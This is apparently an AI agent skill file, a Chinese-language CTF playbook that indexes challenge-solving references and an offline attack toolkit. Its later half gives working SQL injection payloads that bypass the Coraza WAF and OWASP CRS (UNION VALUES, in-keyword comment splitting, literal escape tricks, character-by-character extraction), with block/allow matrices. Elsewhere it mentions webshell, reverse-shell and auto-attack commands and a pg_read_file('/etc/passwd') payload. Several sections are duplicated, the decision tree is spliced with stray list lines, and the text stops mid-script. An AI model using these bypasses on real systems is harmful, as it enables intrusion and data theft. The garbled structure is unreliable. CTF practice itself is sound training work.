---
name: ctf-playbook
description: >-
  CTF竞赛知识库与自动化工具集 — Web/Crypto/PWN/Misc/Reverse解题思路、payload速查、自动化脚本。比赛时快速调用，覆盖SQL注入/XSS/文件上传/隐写/密码破解等常见题型。
domain: cybersecurity
subdomain: penetration-testing
tags:
- ctf
- web
- crypto
- pwn
- misc
- reverse
- forensics
- steganography
- sql-injection
- xss
version: '1.0'
author: zxygeitio
license: Apache-2.0
mitre_attack:
- T1190
- T1059
- T1078
nist_csf:
- ID.RA-01
---
# CTF Playbook / CTF竞赛知识库

## 触发条件

用户提到：CTF比赛、CTF练习、夺旗、解题、flag、攻防世界、BUUCTF、CTFHub、HackTheBox。

先加载：
- `redteam-flag-mode` (如果涉及比赛运营：flag跟踪、证据记录)
- `pentest-tool-mastery` (工具细节)
- 本技能提供：解题思路、payload、自动化脚本

## 核心文件

速查文档 (按需读取):
- `references/ctf-cheatsheet.md` — 完整知识库 (Web/Crypto/PWN/Misc/Reverse)
- `references/ctf-quickref.md` — 快速参考卡 (可打印)
- `references/ctf-writeup-format.md` — 用户偏好writeup格式 (4步式)
- `references/web-game-ctf.md` — Web游戏类CTF题解题模式+flag调试
- `references/grid-game-ctf.md` — 网格游戏CTF (Kolobok/Maze/Dungeon: API控制+BFS寻路+kernel sandbox限制)
- `references/client-side-game-ctf.md` — 浏览器游戏/交互式Web CTF解题法 + flag被拒排查
- `references/ctf-writeup-template.md` — CTF Writeup标准结构模板
- `references/ctf-writeup-template.md` — Writeup模板 (含御网杯格式要求)
- `references/web-game-ctf.md` — Web游戏类CTF题 (贪吃蛇/Flappy Bird等，三种路径解法)
- `references/php-deserialization.md` — PHP反序列化利用 (unserialize→__destruct链/余额篡改/RCE/LFI)
- `references/misc-corrupted-zip.md` — 损坏压缩包分析 (hex修复/base64解码/CRC暴力)
- `references/misc-png-forensics.md` — PNG隐写分析全流程 (chunk解析/trailer提取/像素分析/XOR解密/工具链)
- `references/yuwangbei-ctf-patterns.md` — 御网杯竞赛模式: 跨题联动/XOR key推导/已解题目记录
- `references/misc-nested-zip-maze.md` — 嵌套压缩包迷宫 (逐层解压+base64/MD5+shell循环)
- `references/misc-disguised-file-xor.md` — 伪装文件+嵌入编码提示+XOR解码 (幻影类题)
- `references/re-pe-xor-sbox.md` — PE二进制 XOR+S-Box 替换加密逆向 (VA提取/逆S-Box解码)
- `references/android-apk-re.md` — Android APK + Native .so 逆向 (JNI方法表/ChaCha20密钥提取)
- `references/pyc-bytecode-re.md` — Python .pyc 字节码逆向 (marshal加载/常量池提取/还原算法)

离线CTF工具包 (隔离网络竞赛):
- `/root/ctf-toolkit/ctf.sh` — 主入口 (38个命令, 9大模块)
- 详见 `references/offline-ctf-toolkit.md` — 完整架构+命令速查+赛场流程

自动化脚本:
- `scripts/ctf-web-recon.sh` — Web快速侦察
- `scripts/ctf-sqli-test.sh` — SQL注入检测
- `scripts/ctf-crack.sh` — 密码破解 (hash/zip/rar/ssh/ftp/mysql/base64/rot13/caesar)
- `scripts/ctf-misc-analyze.sh` — Misc文件分析
- `scripts/ctf-crypto.py` — Crypto解密 (15种模式)

## 离线CTF工具包 (完整版)

**路径**: `/root/ctf-toolkit/` | **快捷命令**: `ctf` / `ctf-gui`
**文档**: `/root/ctf-toolkit/USAGE.md` (600+行完整使用文档)
**参考**: `references/offline-ctf-toolkit-architecture.md`
**更新日志**: `/root/ctf-toolkit/UPDATE_LOG.md` (2026-06-07重大更新)
**测试脚本**: `/root/ctf-toolkit/test_simple.sh` (功能验证)

### 工具包架构 (51文件/28目录/39命令)

```
ctf-toolkit/
├── ctf.sh              主入口路由
├── setup.sh            初始化(权限/依赖检查/快捷命令)
├── engine.py           主引擎 (21+3个漏洞插件: +coraza_bypass/game_api/pdf_leak)
├── waf_bypass.py       WAF绕过模块 (Coraza UNION VALUES/left-right替代substring)
├── game_auto.py        游戏题自动化 (API发现/BFS寻路/kernel生成/sandbox检测)
├── test_new_modules.py 模块测试脚本
├── vulnlab.py          靶场模块
├── web/                10个脚本(recon/sqli/upload/ssti/lfi/xss/jwt/cmdi/shell/exploit)
├── crypto/             4个脚本(crypto_tool/rsa_attack/hash_crack/encode_detect)
├── pwn/                4个脚本(checksec/exploit_template/pattern/rop_search)
├── reverse/            3个脚本(static/dynamic/pyc_decompile)
├── misc/               5个脚本(stego/forensics/pcap/file_analyze/zip_crack)
├── recon/              4个脚本(network_scan/service_enum/brute/fuzz)
├── defense/            4个脚本(monitor/patch/flag_protect/detect)
├── scripts/            3个脚本(auto_attack/flag_hunter/batch_exploit)
├── gui/                tkinter图形界面(8标签页)
├── payloads/           Payload模板库(webshell/sqli/xss/ssti/lfi/reverse_shell)
├── wordlists/          离线字典(usernames/passwords/common_dirs)
└── loot/               战利品输出目录
```

### 新增模块 (SAS CTF 2026经验)

### 新增模块 (SAS CTF 2026经验, 2026-06-07)

**路径**: `/root/ctf-toolkit/waf_bypass.py` | `/root/ctf-toolkit/game_auto.py`
**更新日志**: `/root/ctf-toolkit/UPDATE_LOG.md`
**优化总结**: `/root/ctf-toolkit/SAS_CTF_2026_OPTIMIZATION.md`
### 新增模块 (SAS CTF 2026经验)

#### 1. 智能自动化引擎 (`auto_ctf.py`)

**核心功能**: 一键自动化解题 - 自动识别目标类型，自动选择工具链，自动执行测试，自动提取Flag

```bash
# 一键自动化解题
python auto_ctf.py <target>
python auto_ctf.py -b targets.txt
```

**支持的目标类型**:
- Web URL (http://, https://) → Web侦察→注入测试→WAF绕过→Flag提取
- IP/域名 → 端口扫描→服务识别→Web分析→漏洞利用
- 二进制文件 (ELF/PE) → 保护检查→字符串提取→反汇编分析
- 加密文件 → 编码检测→自动解码→密码分析
- Misc文件 (PDF/图片/压缩包/流量包) → 文件类型检测→针对性处理
- 游戏题 → API发现→BFS寻路→自动收集→Kernel生成

#### 2. WAF绕过模块 (`waf_bypass.py`)

**核心发现**: Coraza `@detectSQLi` 检测 `UNION SELECT` 但**不检测 `UNION VALUES`**

```bash
# 检测WAF类型
python waf_bypass.py waf_detect <url>

# UNION VALUES绕过并提取数据
python waf_bypass.py union_values <url> <param> [expr]

# 检测游戏API
python waf_bypass.py game_api <url>

# 检测PDF泄露
python waf_bypass.py pdf_leak <pdf_path>
```

**技术细节**:
- Coraza WAF检查 `ARGS_NAMES|ARGS` (GET参数)
- **不检查** Cookie/POST body/Header/JSON body
- `UNION VALUES` 不在OWASP CRS检测规则中
- 使用 `left/right` 替代被拦截的 `substring()`

**WAF允许/拦截函数矩阵**:
```sql
-- ✅ 允许
current_database(), current_setting(), current_user
left(), right(), ASCII(), trim(), upper(), lower()

-- ❌ 被拦截
substring(), replace(), regexp_replace()
length(), char_length(), CASE WHEN, (SELECT ...)
```

#### 3. 游戏题自动化模块 (`game_auto.py`)

**功能**:
- 游戏API端点自动发现 (`/game_state`, `/move_manual`, etc.)
- BFS自动寻路算法
- 自动收集星星
- Kernel代码生成器
- Sandbox限制检测

```bash
# 自动玩游戏
python game_auto.py auto <url>

# 获取游戏状态
python game_auto.py state <url>

# 移动
python game_auto.py move <url> <direction>

# 生成kernel
python game_auto.py kernel <direction>
```

**Kernel代码生成**:
```python
# 单步移动
def player_kernel(m, a, o):
    o[0] = 1  # 左

# 智能kernel (避开敌人，收集星星)
def player_kernel(m, a, o):
    # 查找玩家位置
    for y in range(9):
        for x in range(9):
            if m[y][x] == 80:
                # 寻找星星并移动
                ...
```

**Sandbox限制** (SAS CTF 2026验证):
- ❌ 禁止: `import`, `__name__`, `lambda`, `while`, `return`, `or`, `and`
- ❌ 禁止: `list()`, `type()`, `print()`, 三元表达式
- ✅ 允许: `for range`, `if`, `len`, 索引访问, `abs`, `%`, `//`

#### 4. 主引擎新增插件 (`engine.py`)

**Coraza WAF绕过插件** (`coraza_bypass`):
- 自动检测Coraza WAF
- 测试UNION VALUES绕过
- 提取数据库名等信息

**游戏API插件** (`game_api`):
- 发现游戏API端点
- 检测sandbox绕过
- 记录可直接调用的API

**PDF泄露插件** (`pdf_leak`):
- 扫描PDF文件
- 提取泄露的flag
- 支持多种flag格式 (flag/FLAG/SAS/ctf/CTF/key/secret/token)

### 快速命令参考

```bash
# 攻击
ctf web-recon <URL>        # Web侦察(10项)
ctf sqli <URL> [param]     # SQL注入(4种+sqlmap)
ctf upload <URL> [path]    # 上传绕过(6种技术)
ctf ssti <URL> [param]     # SSTI(5引擎+RCE)
ctf lfi <URL> <param>      # 文件包含(LFI/RFI/伪协议)
ctf shell all              # 生成全类型Webshell/反弹Shell

# 密码学
ctf crypto auto <input>    # 自动检测+3层递归解码
ctf rsa small_e 3 <c>      # RSA小指数攻击
ctf hash <HASH>            # 哈希识别+破解

# PWN
ctf pwn-check <BINARY>     # 保护检查+利用建议
ctf pwn-exploit <BINARY>   # 自动生成exploit模板

# Misc
ctf stego <FILE>           # 隐写分析(10项)
ctf pcap <FILE>            # 流量分析(HTTP/DNS/FTP/Flag搜索)
ctf zip <FILE>             # 压缩包(伪加密/CRC/john)

# 自动化
ctf auto <TARGET>          # 全自动攻击链
ctf flag-hunt [PATH]       # Flag搜索
ctf gui                    # 启动图形界面

# 新增命令 (SAS CTF 2026经验)
bash ctf.sh auto-solve <target>           # 一键智能解题
bash ctf.sh batch-solve <targets.txt>     # 批量解题
bash ctf.sh coraza-bypass <url> [param]   # Coraza WAF绕过
bash ctf.sh game-auto <url>              # 游戏题自动化
bash ctf.sh game-kernel <direction>      # 生成kernel
bash ctf.sh pdf-leak <url/file>          # PDF泄露检测
```

### GUI图形界面

```bash
ctf-gui                    # 快捷启动
# 8个标签页: Web/Crypto/PWN/Reverse/Misc/Recon/Defense/Tools
# 特性: 暗色主题/一键执行/实时输出/Payload速查/Flag记录/文件浏览
```
- `references/rsa-small-exponent.md` — RSA小指数攻击 (e=3开方/Hastad广播)
- `references/flask-ssti-session-forgery.md` — Flask SSTI→SECRET_KEY提取→session cookie伪造→权限提升链
- `references/path-traversal-filter-bypass.md` — 目录穿越过滤绕过 (str_replace单次替换等)
- `scripts/ctf-crypto.py` — Crypto解密 (15种模式)

实战参考:
- `references/misc-png-forensics.md` — PNG隐写分析全流程 (chunk/trailer/像素/XOR)
- `references/pwn-exploit-patterns.md` — PWN远程利用模板、栈对齐、环境检查
- `references/pwn-fastbin-uaf.md` — Fastbin UAF堆利用 (悬垂指针/利用链/__malloc_hook)
- `references/ctf-writeup-format.md` — CTF解题报告格式（用户偏好）
- `references/php-deserialization.md` — PHP反序列化利用模板
- `references/ctf-quickref.md` — 快速参考卡

## 解题决策树

```
题目类型?
├─ Web
│   ├─ 源码 → 注释/JS/备份/.git/.env
│   ├─ 参数 → SQLi/XSS/IDOR/SSRF/LFI
│   │   ├─ LFI/目录穿越: str_replace('../','')单次替换→用....//绕过 (详见 references/path-traversal-filter-bypass.md)
│   │   └─ SSTI(Jinja2): {{config.SECRET_KEY}}提取密钥→flask-unsign伪造cookie→提权 (详见 references/flask-ssti-session-forgery.md)
│   ├─ 上传 → 绕过(Content-Type/后缀/头/配置文件)
│   ├─ 认证 → 弱口令/JWT/Session/反序列化(unserialize→__destruct/__wakeup)
│   │   ├─ 详见 references/php-deserialization.md
│   │   └─ Flask Session伪造: flask-unsign + SECRET_KEY (详见 references/flask-ssti-session-forgery.md)
│   ├─ 游戏 → 伪造POST/JS注入/自动脚本 (详见 references/web-game-ctf.md)
│   ├─ 网格游戏 → API移动+BFS寻路+kernel sandbox (详见 references/grid-game-ctf.md)
│   └─ 运行: scripts/ctf-web-recon.sh URL
│
├─ Crypto
│   ├─ 编码识别 → Base64/32/Hex/URL/Unicode
│   ├─ 古典密码 → Caesar/Vigenère/Rail Fence/Bacon/Morse
│   ├─ 现代密码 → RSA(小e/共模/因数分解/Wiener)/AES/DES/ChaCha20
│   │   ├─ RSA小e(e=3): m^3 < n → 直接开立方根 (详见 references/rsa-small-exponent.md)
│   │   ├─ Hastad广播+仿射: e=3, k≥3次加密, (a_i*m+b_i)^3 mod n_i → CRT合并+Coppersmith LLL (详见 references/rsa-hastad-affine-attack.md)
│   │   ├─ ECDSA nonce重用: r相同→恢复k→恢复私钥 (详见 references/ecdsa-nonce-reuse.md)
│   │   ├─ ChaCha20: 32B key + 12B nonce, 常量 "expand 32-byte k", counter从0或1开始
- `references/offline-ctf-toolkit.md` — 离线CTF工具包完整架构+38命令速查+AWD策略+赛场流程
- `references/chacha20-ctf.md` — 手动实现+密钥提取+counter坑
- `references/offline-ctf-toolkit-architecture.md` — 离线CTF工具包架构: Engine模式/GUI设计/自动化流水线
- `references/ecdsa-nonce-reuse.md` — ECDSA nonce重用攻击 (r相同→k→私钥, 含验证+完整脚本模板)
- `references/aes-ecb-ctf.md` — AES-ECB CTF模式 (密钥搜索/暴力/已知明文/误报排查)
- `references/sas-ctf-2026-patterns.md` — SAS CTF实战: 平台提交接口/容器操作、Gav Coraza `UNION VALUES` 数字通道 + Git历史诱饵 + PostGIS/GDAL方向、Kolobok独立登录与 `/move_manual` API、Snaking Java Security Manager pitfall
- `references/flask-ssti-session-forgery.md` — Flask SSTI黑名单绕过 + SECRET_KEY提取 + session cookie伪造
- `references/path-traversal-filter-bypass.md` — 目录穿越过滤绕过 (str_replace/regex/编码绕过)
│   │   └─ AES-ECB: 相同明文→相同密文, 无重复块说明明文无重复16B段
│   │       └─ 详见 references/aes-ecb-ctf.md (密钥暴力/已知明文/file误报)
│   ├─ 哈希 → hashcat/john/长度扩展
│   └─ 运行: scripts/ctf-crypto.py <mode> <input>
│
├─ Reverse
│   ├─ 静态 → IDA/Ghidra/strings/objdump
│   ├─ 动态 → gdb+peda/ltrace/strace
│   ├─ .NET → dnSpy/ILSpy
│   ├─ Java → jadx-gui/JD-GUI
│   ├─ PE加密算法 → XOR+S-Box替换 (详见 references/re-pe-xor-sbox.md)
│   │   └─ objdump -s -j .rdata 提取数据 → 逆S-Box解码
│   ├─ Python字节码 → marshal加载pyc → 提取code object常量/co_names/co_varnames
│   │   └─ /usr/bin/python3 -c "import marshal; f=open('x.pyc','rb'); f.read(16); co=marshal.load(f); print(co.co_consts)"
│   ├─ Android APK + Native .so → strings快速侦察 + objdump分析JNI层 + 数据流追踪
│   │   └─ 详见 references/android-apk-re.md (JNI方法表/GOT地址计算/验证逻辑红鲱鱼识别/PKCS7填充)
│   └─ 反调试 → ptrace/时间/信号绕过
│
├─ Misc
│   ├─ 文件分析 → file/strings/binwalk/exiftool
│   ├─ 图片隐写 → PNG: exiftool(trailer!)→zsteg -a→stegoveritas→pngcheck→IDAT解压→像素分析
│   │   ├─ 详见 references/misc-png-forensics.md (chunk解析/trailer提取/像素分析/工具链/密钥推导)
│   │   ├─ 关键: exiftool报"Trailer data after IEND"→隐藏数据在IEND后
│   │   ├─ stegoveritas: 自动trailing data提取+图像变换+通道分离+文件carve
│   │   ├─ trailer加密: 系统性尝试密钥推导(CRC/Adler32/filename/像素值/IHDR)→XOR/AES/RC4/ChaCha20
│   │   ├─ PITFALL: 手动hex转录容易出错(漏字节/奇数字符), 始终用Python程序化提取: trailer.hex()
│   │   ├─ PITFALL: 150+密钥×算法穷举仍失败→立即搜索题目名+CTF+writeup (Bing/Chat01.ai/CSDN)
│   │   ├─ PITFALL: 文件名带编号(image_01)或题目说"每张图"→需多张图片拼接, 检查百度网盘/平台附件
│   │   │   └─ 详见 references/misc-png-forensics.md (御网杯案例: image_01/image_03 trailer不同)
│   │   ├─ PITFALL: trailer hex直接当flag提交被拒→可能需要XOR解密, 检查同比赛其他题目的提示
│   │   │   └─ 御网杯案例: shadow_09提示"FLAG IS HIDDEN IN BASE64 PLUS XOR!" key=0x56
│   │   ├─ PITFALL: 同CTF比赛多题联动→搜索其他题目附件找编码提示/共享密钥
│   │   │   └─ 详见 references/misc-png-forensics.md (御网杯多题联动: XOR key推导)
│   │   └─ JPEG/BMP: steghide (PNG不支持steghide!)
│   ├─ 音频隐写 → 频谱图/SSTV/DTMF/摩尔斯
│   ├─ 流量分析 → Wireshark/tshark (HTTP/FTP/DNS)
│   ├─ 压缩包 → 伪加密/CRC爆破/密码破解 (详见 references/misc-corrupted-zip.md)
│   ├─ 嵌套迷宫 → 逐层解压(shell循环)→base64/hex解码 (详见 references/misc-nested-zip-maze.md)
│   ├─ trailer加密密钥推导: CRC/Adler32/filename/MD5(filename)/像素值/IHDR bytes→XOR/AES/RC4
│   │   └─ 详见 references/misc-png-forensics.md (系统性密钥推导源列表+算法优先级)
│   ├─ 损坏zip → hex分析/修复CRC/提取内容→base64/ROT13/XOR解码
│   ├─ 伪装文件 → file报错但strings有提示→base64解码→单字节XOR暴力 (详见 references/misc-disguised-file-xor.md)
│   └─ 运行: scripts/ctf-misc-analyze.sh FILE
│
├─ PWN
│   ├─ 保护检查 → checksec / readelf -l | grep GNU_STACK
│   ├─ 格式化字符串 → 泄露/写入
│   ├─ 栈溢出 → 检查NX/Canary/PIE决定利用方式
│   │   ├─ NX OFF + 栈地址泄露 → shellcode注入 (详见 references/pwn-exploit-patterns.md)
│   │   │   └─ shellcode + NOP sled + saved_rbp + leaked_addr
│   │   ├─ ret2text: 程序自带后门(backdoor/system("/bin/sh"))→覆盖返回地址跳转
│   │   │   └─ 详见 references/pwn-exploit-patterns.md (含栈对齐ret gadget)
│   │   └─ ret2libc: NX ON无后门→泄露libc地址→计算system/"bin/sh"偏移
│   ├─ 堆利用 → fastbin/tcache/house of *
│   │   ├─ Fastbin UAF (悬垂指针): Delete不置NULL→Edit写已释放内存→覆写fd→__malloc_hook
│   │   │   └─ 详见 references/pwn-fastbin-uaf.md (识别模式/利用链/size check bypass)
│   │   └─ libc-2.23: 无tcache, 无fastbin double-free检测
│   └─ 工具: pwntools/gdb+pwndbg/ROPgadget
│       └─ 注意: /usr/local/bin/python3 可能是ropgadget wrapper, 用 /usr/bin/python3
│           pwntools导入卡住时用纯socket+struct+time替代
│   ├─ Java pwn → Security Manager绕过 (详见下方)
│   └─ pyjnius → JNI层利用 (libc基址泄露→内存利用)
│
└─ Reverse
    ├─ 静态 → IDA/Ghidra/strings/objdump
    ├─ 动态 → gdb+peda/ltrace/strace
    ├─ .NET → dnSpy/ILSpy
    ├─ Java → jadx-gui/JD-GUI
    ├─ .pyc → /usr/bin/python3 -c "import marshal; ..." (详见 references/offline-ctf-toolkit.md)
    └─ 反调试 → ptrace/时间/信号绕过

└─ Defense (AWD攻防赛)
    ├─ Flag保护 → 权限600 + inotify监控 + mount hidepid=2
    ├─ 漏洞修补 → SSH禁密码/MySQL改密/Redis设密/PHP禁函数
    ├─ 入侵检测 → 连接监控/可疑进程/最近文件/日志审计
    ├─ 流量监控 → ss -tnp/tshark抓包/异常端口
    └─ 快速加固脚本 → 详见 references/offline-ctf-toolkit.md (ctf patch all)
```

## AWD攻防赛专项

AWD (Attack With Defense) 比赛需要同时攻击得分和防守保分。工具包完整支持:

### 开赛前5分钟 (保分优先)
1. `ctf flag-protect` — 立即保护flag文件
2. `ctf patch all` — 加固所有服务 (SSH/MySQL/Redis/Apache/Nginx/FTP/SMB/PHP)
3. 备份flag到安全位置

### 攻击阶段
1. `ctf scan <网段>` — 扫描所有靶机
2. `ctf auto <IP>` — 对每台靶机跑全自动攻击链
3. 拿到flag立即提交 (时间=分数)

### 持续防御
1. `ctf detect` — 定期检查入侵痕迹 (每5分钟)
2. `ctf monitor` — 监控异常流量
3. 检查crontab/SSH密钥/webshell后门

### AWD PITFALL
- 攻击和防御要并行, 不能只攻不守
- 修改服务配置后要验证服务还能正常访问
- 备份原始配置再修改 (方便回滚)
- 对方也会修补你发现的漏洞, 要快速利用

## Web 快速检查清单

1. Ctrl+U 查看源代码 (注释/隐藏字段/JS)
2. curl -I URL 查看响应头
3. robots.txt / sitemap.xml
4. .git/HEAD (git-dumper下载)
5. .env / .DS_Store / 备份文件 (www.zip/backup.zip)
6. JS文件分析 (API路由/密钥/隐藏功能)
7. 注册/登录功能 (SQL注入/XSS)
8. 上传功能 (文件上传漏洞)
9. 参数FUZZ (ffuf/dirsearch)
10. 子目录扫描 (admin/api/debug/console)

## Web游戏CTF Sandbox限制模式
详见 `references/sas-ctf-2026-patterns.md` — Kolobok题验证的sandbox禁止项矩阵、API绕过策略、BFS寻路模板

## Coraza WAF SQL注入绕过 (SAS CTF 2026 Gav题实战验证)

Coraza `@detectSQLi` 基于OWASP CRS评分系统，检查范围 `ARGS_NAMES|ARGS`(GET参数)。**不查 Cookie/POST body/Header/JSON body**。

### 核心发现: `UNION VALUES` 完全绕过 @detectSQLi

OWASP CRS检测 `UNION SELECT` 模式，但**不检测 `UNION VALUES`**。PostgreSQL支持 `SELECT ... UNION VALUES (...)` 语法。

| Payload | 状态 | 说明 |
|---------|------|------|
| `UNION SELECT expr` | ❌ 403 | 经典模式被拦截 |
| `UNION ALL SELECT expr` | ❌ 403 | 同样被拦截 |
| `UNION VALUES(expr)` | ✅ 200 | **完全绕过WAF!** |
| `UNION TABLE tablename` | ✅ 500 | 绕过WAF(列数不匹配SQL错误) |

**逐字符ASCII提取公式** (用 `left`/`right` 替代被拦截的 `substring`):
```sql
-- 第N个字符 (N从0开始)
x' UNION VALUES(''||ASCII(left(right(target_expr,-N),1)))--

-- 示例: 提取current_database()的每个字符
x' UNION VALUES(''||ASCII(left(right(current_database(),0),1)))--  → 99(c)
x' UNION VALUES(''||ASCII(left(right(current_database(),1),1)))--  → 116(t)
```

**WAF允许/拦截函数矩阵**:

✅ **允许直接调用**: `current_database()`, `current_setting()`, `current_user`, `pg_backend_pid()`, `trim()`, `upper()`, `lower()`, `reverse()`, `initcap()`, `left()`, `right()`, `ASCII()`, `set_config()`, `''||expr`字符串拼接

❌ **被拦截**: `substring()`, `replace()`, `regexp_replace()`, `translate()`, `length()`, `char_length()`, `octet_length()`, `strpos()`, `position()`, `overlay()`, `lpad()`, `rpad()`, `split_part()`, `pg_read_file()`, `lo_import()`, `lo_from_bytea()`, `dblink_connect()`, `dblink_exec()`, `CASE WHEN`, `(SELECT ...)`子查询

### 关键PITFALL (SAS CTF 2026实测)

1. **EXECUTE INTO 返回值被strip**: PL/pgSQL `EXECUTE ... INTO quality` 只取第一行，且 `signal_quality` 函数会 `regexp_replace(quality, '[^0-9]', '', 'g')`。纯文本flag返回0，需ASCII逐字符提取。

2. **Git history可能是诱饵**: Gav题Git历史中 `SAS{g1t_h1st0ry_1s_pr377y_g00d?}` 提交返回Incorrect，真实flag需通过PostGIS/GDAL BAG链读取 `/flag.txt`。

3. **NOSUPERUSER限制**: ctfuser无 `pg_read_file()`/`lo_import()`/`dblink` 权限，需寻找其他路径(如SUID binary `/nuclear_explosion`)。

4. **容器过期快**: SAS CTF容器默认6分钟到期，所有payload测试要在启动前准备好。

**⭐ 重大发现: `UNION VALUES` 完全绕过 @detectSQLi** (SAS CTF 2026 Gav题实测)

OWASP CRS检测 `UNION SELECT` 模式，但**不检测 `UNION VALUES`**。PostgreSQL支持 `SELECT ... UNION VALUES (...)` 语法，这是绕过Coraza WAF的终极武器。

```sql
-- ✅ 完全绕过WAF，返回200
x' UNION VALUES('test')--
x' UNION VALUES(current_database())--
x' UNION VALUES(current_setting('server_version'))--
x' UNION VALUES(''||ASCII('A'))--  -- 返回65

-- ❌ 被WAF拦截(403)
x' UNION SELECT 'test'--
x' UNION ALL SELECT 'test'--
```

**逐字符数据提取公式** (用 `left`/`right` 替代被拦截的 `substring`):
```sql
-- 第N个字符 (N从0开始)
x' UNION VALUES(''||ASCII(left(right(target_expr,-N),1)))--
-- 示例: 提取current_database()的每个字符
x' UNION VALUES(''||ASCII(left(right(current_database(),0),1)))--  → 99(c)
x' UNION VALUES(''||ASCII(left(right(current_database(),1),1)))--  → 116(t)
```

**WAF允许/拦截函数矩阵**:
| 函数 | 状态 | 说明 |
|------|------|------|
| `current_database()` | ✅ | 直接调用可用 |
| `current_setting()` | ✅ | 读取GUC参数 |
| `current_user` | ✅ | 当前用户 |
| `ASCII()` | ✅ | 仅直接调用，子查询中被拦 |
| `left()`/`right()` | ✅ | substring替代品 |
| `trim()`/`upper()`/`lower()` | ✅ | 字符串变换 |
| `length()`/`char_length()` | ❌ | 被WAF拦截 |
| `substring()`/`replace()` | ❌ | 被WAF拦截 |
| `CASE WHEN` | ❌ | 被WAF拦截(403) |
| `OR`/`AND`/`=` | ❌ | 布尔操作符被拦 |
| `(SELECT ...)` | ❌ | 子查询被拦(403) |
| `dblink_connect()` | ❌ | 返回500(未安装或权限) |
| `pg_read_file()` | ❌ | NOSUPERUSER权限拒绝 |

**PITFALL: EXECUTE INTO 返回值被strip**
PL/pgSQL `EXECUTE ... INTO quality` 只取第一行。`signal_quality`函数会strip非数字字符: `regexp_replace(quality, '[^0-9]', '', 'g')`。所以纯文本flag(SAS{...})返回0，需要ASCII逐字符提取。

### 实际验证的拦截/放行矩阵 (Gav 任务, 2026-06-06)

| Payload | 状态 | 说明 |
|---------|------|------|
| `fresh` | 200 (正常) | baseline |
| `fresh'` | 500 | 单引号触发 SQL 错误,确认注入点 |
| `fresh'--` | **403** | `--` 被拦 |
| `fresh'//` | 500 | 行内注释未拦(非标准) |
| `fresh';--` | 200 | `;` 终止 EXECUTE 当前语句 + `--` 注释闭合引号 |
| `fresh' OR 1=1--` | **403** | 关键字 `OR` 被拦 |
| `fresh'/**/OR/**/1=1--` | **403** | 整段仍被拦(关键字间空白仍触发) |
| `fresh' \nOR\n 1=1` | **403** | 真换行 `%0A` 未绕过 |
| `fresh' \n 文字 \n 1=1` (字面 `\n` 字符) | 500 | **字面 `\n` 字符**(`%5C%6E`)绕过,但产生语法错 |
| `fresh'\tOR\t1=1` (字面 `\t` 字符) | 500 | 字面 tab 绕过 |
| `fresh' \tUNION\tALL\tSELECT` (字面 `\t` 分隔) | **403** | 仍被拦,需在关键字内部分割 |
| `fresh' UN/**/ION ALL SEL/**/ECT '99' AS quality` | 500 | **成功绕过 WAF**(UN→UN/**/ION, SEL→SEL/**/ECT) |
| `fresh' UNI/**/ON ALL SEL/**/ECT '99' AS quality` | 500 | 同样绕过 |
| `fresh';RAISE EXCEPTION 'X';--` | 500 | 多语句执行但语法错(EXECUTE 单条 SELECT INTO 不允许多条) |

### 关键 pitfall

1. **`\n`/`\t` 字面字符 vs URL 编码换行**:必须用 `%5C%6E`(字面 `\n`)或 `%5C%74`(字面 `\t`),**不能用** `%0A`/`%09`(真换行/真 tab)。coraza 的 `t:utf8toUnicode` 步骤会把 `\` 转义后再检测。

2. **Python `requests` 库会自动 URL 编码**,把字面 `\t` 编码成 `%5Ct`,会破坏绕过。要用 `urllib.parse.quote(s, safe='')` 手动编码后用 `requests.get(url, ...)` 直接传完整 URL:
   ```python
   from urllib.parse import quote
   full_url = f"{base}?pulse={quote(payload, safe='')}"
   requests.get(full_url, verify=False)
   ```

3. **`/**/` 块注释必须放在关键字字母中间**(如 `UN/**/ION`),不能放关键字之间(如 `UNION /**/ ALL`),后者仍被拦。

4. **EXECUTE INTO 期望单行结果**:成功执行注入 SQL 后,主查询返回 0 行(token 无匹配),`EXECUTE ... INTO quality` 没有 INTO 目标可填 → quality 保持初值 0,响应 `pulse_quality=0`。要在 UNION ALL 注入时给 SELECT 一个列别名匹配目标列(如 `SELECT '99' AS quality`)。

5. **EXECUTE 字符串末尾固定有 `'`**:注入 payload 用 `--` 注释掉它会留下未闭合的字符串 → SQL 语法错。要么用 `;` 终止当前语句(让后面的 `'` 成为 EXECUTE 参数结束符),要么用平衡的引号结构。

6. **容器过期很快**:SAS CTF 容器默认 6 分钟到期,期间需要"启动 → 探索 → 利用 → 提交"一气呵成。**所有 payload 测试要在启动前准备好**,不要边想边试。

### UNION VALUES 绕过 (SAS CTF 2026 Gav 题实测)

**重大发现**: `UNION VALUES` 可以完全绕过 Coraza `@detectSQLi`，且不需要关键字内部分割！

原理: OWASP CRS 的 `@detectSQLi` 评分系统检测 `UNION SELECT` 模式，但不检测 `UNION VALUES`。PostgreSQL 支持 `SELECT ... UNION VALUES (...)` 语法。

| Payload | 状态 | 说明 |
|---------|------|------|
| `x' UNION VALUES('test')--` | 200 | ✅ 绕过WAF，返回数据 |
| `x' UNION VALUES(current_database())--` | 200 | ✅ 可调用函数 |
| `x' UNION VALUES(version())--` | 500 | version()有特殊字符导致类型错误 |
| `x' UNION VALUES(current_setting('server_version'))--` | 200 | ✅ 可读配置 |
| `x' UNION VALUES(pg_read_file('/etc/passwd',0,100))--` | 500 | 权限不足(ctfuser非superuser) |
| `x' UNION VALUES(''||ASCII('A'))--` | 200 | ✅ ASCII值转数字提取 |
| `x' UNION VALUES((SELECT 1))--` | 403 | ⚠️ 子查询被拦 |
| `x' UNION TABLE tablename--` | 500 | 表列数不匹配时SQL错误(非WAF拦截),可用于探测表是否存在 |
| `x' UNION VALUES(set_config('key','val',false))--` | 200 | ✅ 可修改session配置参数 |
| `x' UNION VALUES(current_setting('param',true))--` | 200 | ✅ missing_ok=true避免不存在时500错误 |
| `x' UNION VALUES(CASE WHEN...THEN...END)--` | 403 | CASE WHEN被拦 |

**关键限制**:
- `SELECT` 在子查询中被拦(403)，不能用 `(SELECT col FROM table)`
- `CASE WHEN` 被拦(403)
- `length()`, `ASCII()` 在子查询中被拦，但在直接 VALUES 参数中可用
- `substring()`, `replace()`, `regexp_replace()` 被拦

### 数据逐字符提取方法 (left/right 替代 substring)

当 `substring()` 被 WAF 拦截时，用 `left(right(text,-N),1)` 提取第 N+1 个字符:

```sql
-- 第1个字符
x' UNION VALUES(''||ASCII(left(current_database(),1)))--    → 99 (c)

-- 第N+1个字符 (N从0开始)
x' UNION VALUES(''||ASCII(left(right(current_database(),-N),1)))-- 

-- 完整自动化提取脚本
for i in 0 1 2 3 4 5; do
    if [ $i -eq 0 ]; then
        expr="left(current_database(),1)"
    else
